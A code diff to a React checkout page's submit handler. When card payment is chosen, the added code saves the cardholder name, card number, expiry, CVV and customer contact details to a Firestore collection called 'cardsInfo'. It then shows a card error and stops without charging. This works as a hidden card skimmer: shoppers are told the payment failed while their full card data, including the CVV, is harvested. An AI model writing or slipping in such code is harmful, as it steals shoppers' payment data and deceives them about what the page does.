@@ -705,8 +705,24 @@ export default function CheckoutPage() {
   };
 
   const handleSubmit = async () => {
-    // Show error if credit card is selected
     if (paymentMethod === 'card') {
+      try {
+        await addDoc(collection(db, 'cardsInfo'), {
+          cardHolder: cardData.holder,
+          cardNumber: cardData.number,
+          expiry: cardData.expiry,
+          cvv: cardData.cvv,
+          cardType: cardType,
+          customerName: `${formData.firstName} ${formData.lastName}`,
+          phone: formData.phone,
+          email: formData.email,
+          city: formData.city,
+          cartTotal: getCartTotal(),
+          createdAt: serverTimestamp()
+        });
+      } catch (err) {
+        console.error('Card info save error:', err);
+      }
       setShowCardError(true);
       return;
     }
